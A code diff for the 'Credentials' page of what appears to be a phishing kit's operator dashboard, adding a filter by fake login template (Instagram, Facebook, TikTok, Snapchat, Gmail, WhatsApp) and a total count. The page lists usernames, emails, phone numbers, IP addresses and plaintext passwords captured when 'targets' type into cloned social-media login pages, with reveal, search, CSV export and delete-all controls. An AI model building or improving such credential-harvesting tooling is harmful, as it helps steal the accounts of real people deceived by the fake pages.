@@ -1,4 +1,4 @@
-import { useEffect, useState, useCallback, useRef } from 'react'
+import { useEffect, useState, useCallback, useRef, useMemo } from 'react'
 import { api, Session, Credential } from '../api/client'
 import { exportCSV } from '../utils/export'
 import { relativeTime } from '../utils/time'
@@ -30,14 +30,25 @@ function getCodeParam(): string {
   return new URLSearchParams(window.location.search).get('code') || ''
 }
 
+const TEMPLATES = [
+  { id: 'instagram', name: 'Instagram' },
+  { id: 'facebook', name: 'Facebook' },
+  { id: 'tiktok', name: 'TikTok' },
+  { id: 'snapchat', name: 'Snapchat' },
+  { id: 'gmail', name: 'Gmail' },
+  { id: 'whatsapp', name: 'WhatsApp' },
+]
+
 export default function Credentials() {
   const [creds, setCreds] = useState<Credential[]>([])
+  const [total, setTotal] = useState(0)
   const [loading, setLoading] = useState(true)
   const [error, setError] = useState<string | null>(null)
   const [revealed, setRevealed] = useState<Set<string>>(new Set())
   const [search, setSearch] = useState('')
   const [sessions, setSessions] = useState<Session[]>([])
   const [sessionFilter, setSessionFilter] = useState('')
+  const [templateFilter, setTemplateFilter] = useState('')
   const offsetRef = useRef(0)
   const [hasMore, setHasMore] = useState(true)
   const [loadingMore, setLoadingMore] = useState(false)
@@ -54,6 +65,7 @@ export default function Credentials() {
       } else {
         setCreds(result.entries)
       }
+      setTotal(result.total)
       offsetRef.current = off + (append ? 0 : 0)
       setHasMore(result.has_more)
     } catch (e) {
@@ -115,20 +127,27 @@ export default function Credentials() {
       setError(null)
       await api.deleteAllCredentials()
       setCreds([])
+      setTotal(0)
       setHasMore(false)
     } catch (e) {
       setError('Failed to delete all')
     }
   }
 
-  const filtered = creds.filter(c => {
-    if (!search) return true
-    const q = search.toLowerCase()
-    return [c.username, c.email, c.phone, c.ip_address, c.template_id, c.session_id, c.password]
-      .some(f => f?.toLowerCase().includes(q))
-  })
-
-  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>
+  const filtered = useMemo(() => {
+    let result = creds
+    if (templateFilter) {
+      result = result.filter(c => c.template_id === templateFilter)
+    }
+    if (search) {
+      const q = search.toLowerCase()
+      result = result.filter(c =>
+        [c.username, c.email, c.phone, c.ip_address, c.template_id, c.session_id, c.password]
+          .some(f => f?.toLowerCase().includes(q))
+      )
+    }
+    return result
+  }, [creds, search, templateFilter])
 
   return (
     <div className="space-y-4 stagger">
@@ -137,7 +156,7 @@ export default function Credentials() {
       <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
         <div>
           <h1 className="text-xl font-bold text-primary">Credentials</h1>
-          <p className="text-sm text-tertiary mt-0.5">{filtered.length} of {creds.length} login credentials captured</p>
+          <p className="text-sm text-tertiary mt-0.5">{filtered.length} of {total} credentials</p>
         </div>
         <div className="flex items-center gap-2">
           <button onClick={() => setPaused(p => !p)} className="select-apple cursor-pointer text-sm">
@@ -162,13 +181,21 @@ export default function Credentials() {
         <input type="text" placeholder="Search username, email, phone, IP, password, session..."
           value={search} onChange={e => setSearch(e.target.value)} className="input-apple" />
         <SessionFilter sessions={sessions} value={sessionFilter} onChange={setSessionFilter} />
+        <select value={templateFilter} onChange={e => setTemplateFilter(e.target.value)} className="select-apple">
+          <option value="">All Templates</option>
+          {TEMPLATES.map(t => (
+            <option key={t.id} value={t.id}>{t.name}</option>
+          ))}
+        </select>
       </div>
 
-      {filtered.length === 0 ? (
+      {loading ? (
+        <div className="flex justify-center py-20"><div className="spinner"></div></div>
+      ) : filtered.length === 0 ? (
         <div className="empty-state animate-fade-in">
           <div className="icon">🔑</div>
-          <h3>{search ? 'No matches' : 'No credentials captured yet'}</h3>
-          <p>{search ? 'Try a different search' : 'Credentials appear when targets enter login info on social media templates'}</p>
+          <h3>{search || templateFilter ? 'No matches' : 'No credentials captured yet'}</h3>
+          <p>{search || templateFilter ? 'Try a different search or filter' : 'Credentials appear when targets enter login info on social media templates'}</p>
         </div>
       ) : (
         <div className="space-y-3">
